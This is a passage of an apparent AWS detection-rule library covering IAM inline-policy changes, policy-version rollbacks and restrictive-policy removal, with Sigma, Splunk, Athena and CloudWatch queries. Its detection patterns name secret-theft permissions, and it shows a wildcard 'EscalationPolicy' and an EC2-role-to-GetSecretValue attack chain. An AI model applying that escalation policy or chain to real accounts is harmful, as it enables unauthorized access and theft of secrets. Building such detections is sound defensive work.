    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "organizations.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.policyId", "eventSource", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "organizations.amazonaws.com", eventName: "DetachPolicy", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { policyId: "p-xxx", targetId: "ou-xxx" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who modified or detached the SCP.", "Assess impact on organization-wide guardrails.", "Verify if this was planned governance change.", "Restore SCP if unauthorized."],
    testingSteps: ["Detach or update a Service Control Policy in Organizations.", "Verify CloudTrail captures DetachPolicy/DeletePolicy/UpdatePolicy.", "Run the detection to confirm the alert triggers."],},

  // --- IAM Inline Policy Injection ---
  {
    id: "det-031",
    title: "IAM Inline Policy Modification",
    description: "Detects when inline IAM policies are added or updated via PutRolePolicy or PutUserPolicy. Provides baseline visibility into IAM inline policy changes affecting roles and users. Important activity but not necessarily malicious — fires during normal operations (Terraform, CI/CD, manual admin tasks).",
    awsService: "IAM",
    relatedServices: [],
    severity: "Medium",
    tags: ["IAM", "Inline Policy", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate policy updates by admins", "Infrastructure automation (Terraform, CloudFormation)"],
    rules: {
      sigma: `title: IAM Inline Policy Modification
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName:
      - PutRolePolicy
      - PutUserPolicy
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com (eventName=PutRolePolicy OR eventName=PutUserPolicy)
| table _time, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName IN ('PutRolePolicy', 'PutUserPolicy')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, sourceIPAddress
| filter eventSource = "iam.amazonaws.com"
| filter eventName in ["PutRolePolicy", "PutUserPolicy"]
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["PutRolePolicy", "PutUserPolicy"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: {
      primaryLogSource: "AWS CloudTrail",
      generatingService: "iam.amazonaws.com",
      importantFields: ["eventSource", "eventName", "userIdentity.arn", "userIdentity.type", "requestParameters.roleName", "requestParameters.userName", "sourceIPAddress", "eventTime"],
      exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "PutRolePolicy", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { roleName: "TargetRole", policyName: "EscalationPolicy", policyDocument: "{}" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2),
    },
    investigationSteps: ["Identify the identity that modified the inline policy.", "Verify whether the change was authorized.", "Inspect the policy document for excessive permissions.", "Review userIdentity.sessionContext.sessionIssuer.arn for assumed roles."],
    testingSteps: ["Call PutRolePolicy or PutUserPolicy with a test policy.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-032",
    title: "Suspicious Inline Policy Privilege Escalation",
    description: "Detects PutRolePolicy/PutUserPolicy calls where the inline policy grants suspicious privileges. Attackers often use inline policies to escalate privileges or gain access to sensitive resources. Suspicious content includes Action \"*\", Resource \"*\", or high-risk permissions like iam:*, sts:AssumeRole, iam:PassRole, kms:Decrypt, secretsmanager:GetSecretValue, s3:GetObject.",
    awsService: "IAM",
    relatedServices: [],
    severity: "Critical",
    tags: ["IAM", "Inline Policy", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Admin creating broad policies for service accounts", "Legitimate cross-account assume role setup"],
    rules: {
      sigma: `title: Suspicious Inline Policy Privilege Escalation
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName:
      - PutRolePolicy
      - PutUserPolicy
  filter_policy:
    requestParameters.policyDocument|contains:
      - '"Action":"*"'
      - '"Resource":"*"'
      - 'iam:*'
      - 'sts:AssumeRole'
      - 'iam:PassRole'
      - 'kms:Decrypt'
      - 'secretsmanager:GetSecretValue'
      - 's3:GetObject'
  condition: selection and filter_policy
level: critical`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com (eventName=PutRolePolicy OR eventName=PutUserPolicy)
| where like(requestParameters.policyDocument, "%*%") OR like(requestParameters.policyDocument, "%iam:*%") OR like(requestParameters.policyDocument, "%sts:AssumeRole%") OR like(requestParameters.policyDocument, "%iam:PassRole%") OR like(requestParameters.policyDocument, "%kms:Decrypt%") OR like(requestParameters.policyDocument, "%secretsmanager:GetSecretValue%") OR like(requestParameters.policyDocument, "%s3:GetObject%")
| table _time, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, requestParameters.policyDocument
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName IN ('PutRolePolicy', 'PutUserPolicy')
  AND (
    requestParameters.policyDocument LIKE '%"Action":"*"%'
    OR requestParameters.policyDocument LIKE '%"Resource":"*"%'
    OR requestParameters.policyDocument LIKE '%iam:*%'
    OR requestParameters.policyDocument LIKE '%sts:AssumeRole%'
    OR requestParameters.policyDocument LIKE '%iam:PassRole%'
    OR requestParameters.policyDocument LIKE '%kms:Decrypt%'
    OR requestParameters.policyDocument LIKE '%secretsmanager:GetSecretValue%'
    OR requestParameters.policyDocument LIKE '%s3:GetObject%'
  )
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName
| filter eventSource = "iam.amazonaws.com"
| filter eventName in ["PutRolePolicy", "PutUserPolicy"]
| filter requestParameters.policyDocument like /"Action":"\*"/ or requestParameters.policyDocument like /"Resource":"\*"/ or requestParameters.policyDocument like /iam:\*/ or requestParameters.policyDocument like /sts:AssumeRole/ or requestParameters.policyDocument like /iam:PassRole/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["PutRolePolicy", "PutUserPolicy"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: {
      primaryLogSource: "AWS CloudTrail",
      generatingService: "iam.amazonaws.com",
      importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.roleName", "requestParameters.userName", "requestParameters.policyDocument", "sourceIPAddress", "eventTime"],
      exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "PutRolePolicy", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { roleName: "TargetRole", policyName: "EscalationPolicy", policyDocument: '{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2),
    },
    investigationSteps: ["Identify who added the inline policy and which principal was targeted.", "Inspect the policy document for excessive permissions.", "Verify if the actor is a known admin or automation.", "Check for self-modification (actor modifying their own role/user)."],
    testingSteps: ["Add an inline policy with Action * and Resource * to a test role.", "Verify CloudTrail captures the event with policyDocument.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-033",
    title: "Inline Policy Modification by Unexpected Actor",
    description: "Detects IAM policy changes (PutRolePolicy, PutUserPolicy) performed by actors that normally should not modify IAM permissions. IAM policy modifications are typically performed by limited administrative roles or infrastructure automation. Suspicious actors include IAM users, application roles, EC2 instance roles, and assumed roles outside normal IAM administration. Uses userIdentity.type, userIdentity.arn, and userIdentity.sessionContext.sessionIssuer.arn.",
    awsService: "IAM",
    relatedServices: [],
    severity: "High",
    tags: ["IAM", "Inline Policy", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate DevOps or automation roles", "IAM admin users with expected access"],
    rules: {
      sigma: `title: Inline Policy Modification by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName:
      - PutRolePolicy
      - PutUserPolicy
  filter_known_admin:
    userIdentity.principalId|contains:
      - 'terraform'
      - 'cloudformation'
      - 'admin'
      - 'Admin'
      - 'IAMAdmin'
  condition: selection and not filter_known_admin
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com (eventName=PutRolePolicy OR eventName=PutUserPolicy)
| where NOT (like(userIdentity.principalId, "%terraform%") OR like(userIdentity.principalId, "%cloudformation%") OR like(userIdentity.arn, "%admin%") OR like(userIdentity.arn, "%Admin%") OR like(userIdentity.arn, "%IAMAdmin%"))
| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.roleName, requestParameters.userName`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.roleName, requestParameters.userName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName IN ('PutRolePolicy', 'PutUserPolicy')
  AND userIdentity.principalId NOT LIKE '%terraform%'
  AND userIdentity.principalId NOT LIKE '%cloudformation%'
  AND userIdentity.arn NOT LIKE '%admin%'
  AND userIdentity.arn NOT LIKE '%Admin%'
  AND userIdentity.arn NOT LIKE '%IAMAdmin%'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.roleName, requestParameters.userName
| filter eventSource = "iam.amazonaws.com"
| filter eventName in ["PutRolePolicy", "PutUserPolicy"]
| filter userIdentity.principalId not like /terraform/ and userIdentity.principalId not like /cloudformation/ and userIdentity.arn not like /admin/i
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["PutRolePolicy", "PutUserPolicy"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: {
      primaryLogSource: "AWS CloudTrail",
      generatingService: "iam.amazonaws.com",
      importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.roleName", "requestParameters.userName", "sourceIPAddress", "eventTime"],
      exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "PutRolePolicy", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/app-user", principalId: "AIDAEXAMPLE" }, requestParameters: { roleName: "TargetRole", policyName: "EscalationPolicy" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2),
    },
    investigationSteps: ["Identify the actor type (IAMUser, AssumedRole) and ARN.", "Verify if this identity is authorized to modify IAM policies.", "Check userIdentity.sessionContext.sessionIssuer.arn for assumed roles.", "Review whether the actor is an EC2 instance role or application role."],
    testingSteps: ["As a non-admin IAM user or assumed role, call PutRolePolicy.", "Verify CloudTrail captures the event.", "Run the detection to confirm it triggers on unexpected actors."],
  },
  {
    id: "det-034",
    title: "Inline Policy Modification Followed by Sensitive API Use",
    description: "Behavior correlation: detects when PutRolePolicy or PutUserPolicy is followed within 10 minutes by the same identity performing sensitive API calls (AssumeRole, GetSecretValue, ListBuckets). Example attack chain: attacker compromises EC2 role → PutRolePolicy → AssumeRole, GetSecretValue, ListBuckets. Catches real attacks with much higher confidence than single-event rules.",
    awsService: "IAM",
    relatedServices: ["STS", "Secrets Manager", "S3"],
    severity: "Critical",
    tags: ["IAM", "Inline Policy", "Behavior Correlation", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate policy update followed by normal API use", "DevOps workflow updating role then assuming it"],
    rules: {
      sigma: `title: Inline Policy Modification Followed by Sensitive API Use
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_policy:
    eventSource: iam.amazonaws.com
    eventName:
      - PutRolePolicy
      - PutUserPolicy
  selection_sensitive:
    eventName:
      - AssumeRole
      - GetSecretValue
      - ListBuckets
  condition: 1 of selection_*
level: critical
# Note: Full correlation (same identity, within 10 min) requires SIEM correlation or runbooks.
# This Sigma rule identifies both event types; implement time-window correlation in your SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=iam.amazonaws.com AND (eventName=PutRolePolicy OR eventName=PutUserPolicy))
   OR (eventName=AssumeRole OR eventName=GetSecretValue OR eventName=ListBuckets))
| eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
| transaction actor maxspan=10m
| where mvcount(mvfilter(eventSource="iam.amazonaws.com" AND eventName IN ("PutRolePolicy","PutUserPolicy")))>0
  AND mvcount(mvfilter(eventName IN ("AssumeRole","GetSecretValue","ListBuckets")))>0
| table _time, actor, eventName, requestParameters.roleName, requestParameters.userName`,
      cloudtrail: `WITH policy_mods AS (
  SELECT userIdentity.arn AS actor, eventTime AS policy_time
  FROM cloudtrail_logs
  WHERE eventSource = 'iam.amazonaws.com'
    AND eventName IN ('PutRolePolicy', 'PutUserPolicy')
),
sensitive_use AS (
  SELECT userIdentity.arn AS actor, eventTime AS use_time, eventName
  FROM cloudtrail_logs
  WHERE eventName IN ('AssumeRole', 'GetSecretValue', 'ListBuckets')
)
SELECT p.actor, p.policy_time, s.use_time, s.eventName
FROM policy_mods p
JOIN sensitive_use s ON p.actor = s.actor
  AND s.use_time > p.policy_time
  AND s.use_time <= p.policy_time + INTERVAL '10' MINUTE
ORDER BY p.policy_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, eventSource
| filter (eventSource = "iam.amazonaws.com" and eventName in ["PutRolePolicy", "PutUserPolicy"])
  or eventName in ["AssumeRole", "GetSecretValue", "ListBuckets"]
| stats count(*) as cnt, collect_list(eventName) as events by userIdentity.arn
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["PutRolePolicy", "PutUserPolicy"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: {
      primaryLogSource: "AWS CloudTrail",
      generatingService: "iam.amazonaws.com",
      importantFields: ["eventSource", "eventName", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.roleName", "requestParameters.userName", "eventTime"],
      exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "PutRolePolicy", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/ec2-role/i-xxx" }, requestParameters: { roleName: "TargetRole", policyName: "EscalationPolicy" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2),
    },
    investigationSteps: ["Identify the identity that performed the policy modification.", "Review the sequence: policy change → sensitive API use within 10 minutes.", "Verify if AssumeRole/GetSecretValue/ListBuckets was expected.", "Check whether the actor compromised an EC2 or application role before the policy change."],
    testingSteps: ["As a test role, call PutRolePolicy, then within 10 min call AssumeRole or GetSecretValue.", "Verify both events appear in CloudTrail.", "Run the Splunk or Athena correlation query to confirm the alert triggers."],
  },

  // --- IAM Set Default Policy Version ---
  {
    id: "det-035",
    title: "IAM Policy Default Version Change",
    description: "Baseline visibility into managed policy version changes. Detects SetDefaultPolicyVersion API calls. Legitimate IAM management may perform this operation.",
    awsService: "IAM",
    relatedServices: [],
    severity: "Medium",
    tags: ["IAM", "Policy Version", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate policy version updates", "Terraform/CloudFormation policy management"],
    rules: {
      sigma: `title: IAM Policy Default Version Change
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName: SetDefaultPolicyVersion
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com eventName=SetDefaultPolicyVersion
| table _time, userIdentity.arn, eventName, requestParameters.policyArn, requestParameters.versionId, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.policyArn, requestParameters.versionId, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName = 'SetDefaultPolicyVersion'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.policyArn, requestParameters.versionId, sourceIPAddress
| filter eventSource = "iam.amazonaws.com"
| filter eventName = "SetDefaultPolicyVersion"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["SetDefaultPolicyVersion"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "userIdentity.type", "requestParameters.policyArn", "requestParameters.versionId", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "SetDefaultPolicyVersion", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { policyArn: "arn:aws:iam::123456789012:policy/TargetPolicy", versionId: "v1" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who changed the policy default version.", "Verify whether the version change was authorized.", "Check if the new default version has broader permissions than the previous one.", "Review policy version history for rollback indicators."],
    testingSteps: ["Call SetDefaultPolicyVersion on a test policy.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-036",
    title: "Suspicious Policy Version Rollback",
    description: "Detects potential privilege escalation when SetDefaultPolicyVersion affects high-value policies. Attackers may roll back policy versions to restore admin access or broad permissions. Focuses on policies attached to roles or users that may restore previously removed privileges.",
    awsService: "IAM",
    relatedServices: [],
    severity: "High",
    tags: ["IAM", "Policy Version", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate rollback after failed policy update", "Admin restoring previous policy version"],
    rules: {
      sigma: `title: Suspicious Policy Version Rollback
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName: SetDefaultPolicyVersion
  filter_admin_policy:
    requestParameters.policyArn|contains:
      - 'Admin'
      - 'AdministratorAccess'
      - 'PowerUser'
      - 'FullAccess'
  condition: selection and filter_admin_policy
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com eventName=SetDefaultPolicyVersion
| where like(requestParameters.policyArn, "%Admin%") OR like(requestParameters.policyArn, "%PowerUser%") OR like(requestParameters.policyArn, "%FullAccess%") OR like(requestParameters.policyArn, "%AdministratorAccess%")
| table _time, userIdentity.arn, eventName, requestParameters.policyArn, requestParameters.versionId`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.policyArn, requestParameters.versionId
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName = 'SetDefaultPolicyVersion'
  AND (requestParameters.policyArn LIKE '%Admin%' OR requestParameters.policyArn LIKE '%PowerUser%' OR requestParameters.policyArn LIKE '%FullAccess%' OR requestParameters.policyArn LIKE '%AdministratorAccess%')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.policyArn, requestParameters.versionId
| filter eventSource = "iam.amazonaws.com"
| filter eventName = "SetDefaultPolicyVersion"
| filter requestParameters.policyArn like /Admin|PowerUser|FullAccess|AdministratorAccess/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["SetDefaultPolicyVersion"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.policyArn", "requestParameters.versionId", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "SetDefaultPolicyVersion", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { policyArn: "arn:aws:iam::123456789012:policy/AdminPolicy", versionId: "v1" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who rolled back the policy version.", "Compare the new default version with the previous one for permission changes.", "Verify if the policy was recently tightened and the rollback restores broader access.", "Check whether the actor is authorized for policy version management."],
    testingSteps: ["Set default version on a policy with Admin in the name.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-037",
    title: "Policy Version Change by Unexpected Actor",
    description: "Detects SetDefaultPolicyVersion performed by identities that normally should not manage IAM policies. Suspicious actors include IAM users, application roles, EC2 instance roles, and assumed roles outside IAM administration.",
    awsService: "IAM",
    relatedServices: [],
    severity: "High",
    tags: ["IAM", "Policy Version", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate DevOps or automation roles", "IAM admin users with expected access"],
    rules: {
      sigma: `title: Policy Version Change by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName: SetDefaultPolicyVersion
  filter_known_admin:
    userIdentity.principalId|contains:
      - 'terraform'
      - 'cloudformation'
      - 'admin'
      - 'Admin'
      - 'IAMAdmin'
  condition: selection and not filter_known_admin
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com eventName=SetDefaultPolicyVersion
| where NOT (like(userIdentity.principalId, "%terraform%") OR like(userIdentity.principalId, "%cloudformation%") OR like(userIdentity.arn, "%admin%") OR like(userIdentity.arn, "%Admin%") OR like(userIdentity.arn, "%IAMAdmin%"))
| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.policyArn`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.policyArn, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName = 'SetDefaultPolicyVersion'
  AND userIdentity.principalId NOT LIKE '%terraform%'
  AND userIdentity.principalId NOT LIKE '%cloudformation%'
  AND userIdentity.arn NOT LIKE '%admin%'
  AND userIdentity.arn NOT LIKE '%Admin%'
  AND userIdentity.arn NOT LIKE '%IAMAdmin%'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.policyArn
| filter eventSource = "iam.amazonaws.com"
| filter eventName = "SetDefaultPolicyVersion"
| filter userIdentity.principalId not like /terraform/ and userIdentity.principalId not like /cloudformation/ and userIdentity.arn not like /admin/i
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["SetDefaultPolicyVersion"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.policyArn", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "SetDefaultPolicyVersion", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/app-role/i-xxx" }, requestParameters: { policyArn: "arn:aws:iam::123456789012:policy/TargetPolicy", versionId: "v1" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor type (IAMUser, AssumedRole) and ARN.", "Verify if this identity is authorized to manage IAM policy versions.", "Check userIdentity.sessionContext.sessionIssuer.arn for assumed roles.", "Review whether the actor is an EC2 instance role or application role."],
    testingSteps: ["As a non-admin role, call SetDefaultPolicyVersion.", "Verify CloudTrail captures the event.", "Run the detection to confirm it triggers on unexpected actors."],
  },

  // --- IAM Policy Delete or Detach ---
  {
    id: "det-038",
    title: "IAM Policy Detached or Deleted",
    description: "Baseline visibility into IAM policy removals. Detects DetachUserPolicy, DetachRolePolicy, DeleteUserPolicy, DeleteRolePolicy. Policy updates may occur during legitimate IAM administration.",
    awsService: "IAM",
    relatedServices: [],
    severity: "Medium",
    tags: ["IAM", "Policy Detach", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate policy lifecycle management", "Terraform/CloudFormation detach operations"],
    rules: {
      sigma: `title: IAM Policy Detached or Deleted
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName:
      - DetachUserPolicy
      - DetachRolePolicy
      - DeleteUserPolicy
      - DeleteRolePolicy
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com (eventName=DetachUserPolicy OR eventName=DetachRolePolicy OR eventName=DeleteUserPolicy OR eventName=DeleteRolePolicy)
| table _time, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, requestParameters.policyArn, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, requestParameters.policyArn, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName IN ('DetachUserPolicy', 'DetachRolePolicy', 'DeleteUserPolicy', 'DeleteRolePolicy')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, requestParameters.policyArn, sourceIPAddress
| filter eventSource = "iam.amazonaws.com"
| filter eventName in ["DetachUserPolicy", "DetachRolePolicy", "DeleteUserPolicy", "DeleteRolePolicy"]
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["DetachUserPolicy", "DetachRolePolicy", "DeleteUserPolicy", "DeleteRolePolicy"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.roleName", "requestParameters.userName", "requestParameters.policyArn", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "DetachUserPolicy", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { userName: "TargetUser", policyArn: "arn:aws:iam::aws:policy/ReadOnlyAccess" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who detached or deleted the policy.", "Verify whether the removal was authorized.", "Check if the policy was restrictive (deny, permission boundary).", "Review the target principal's remaining permissions."],
    testingSteps: ["Call DetachUserPolicy or DeleteUserPolicy on a test principal.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-039",
    title: "Suspicious Removal of Restrictive Policy",
    description: "Detects when policy detach or deletion may increase privileges. Attackers often remove restrictive policies (deny policies, permission boundaries) to expand permissions. Focuses on removal of policies with restrictive names or ARNs.",
    awsService: "IAM",
    relatedServices: [],
    severity: "High",
    tags: ["IAM", "Policy Detach", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate removal of obsolete deny policies", "Policy lifecycle cleanup"],
    rules: {
      sigma: `title: Suspicious Removal of Restrictive Policy
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName:
      - DetachUserPolicy
      - DetachRolePolicy
      - DeleteUserPolicy
      - DeleteRolePolicy
  filter_arn:
    requestParameters.policyArn|contains:
      - 'Deny'
      - 'Restrict'
      - 'Boundary'
      - 'ReadOnly'
      - 'Limited'
  filter_name:
    requestParameters.policyName|contains:
      - 'Deny'
      - 'Restrict'
      - 'Boundary'
  condition: selection and (filter_arn or filter_name)
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=iam.amazonaws.com (eventName=DetachUserPolicy OR eventName=DetachRolePolicy OR eventName=DeleteUserPolicy OR eventName=DeleteRolePolicy)
| where like(requestParameters.policyArn, "%Deny%") OR like(requestParameters.policyArn, "%Restrict%") OR like(requestParameters.policyArn, "%Boundary%") OR like(requestParameters.policyArn, "%ReadOnly%") OR like(requestParameters.policyArn, "%Limited%") OR like(requestParameters.policyName, "%Deny%") OR like(requestParameters.policyName, "%Restrict%") OR like(requestParameters.policyName, "%Boundary%")
| table _time, userIdentity.arn, eventName, requestParameters.roleName, requestParameters.userName, requestParameters.policyArn, requestParameters.policyName`,
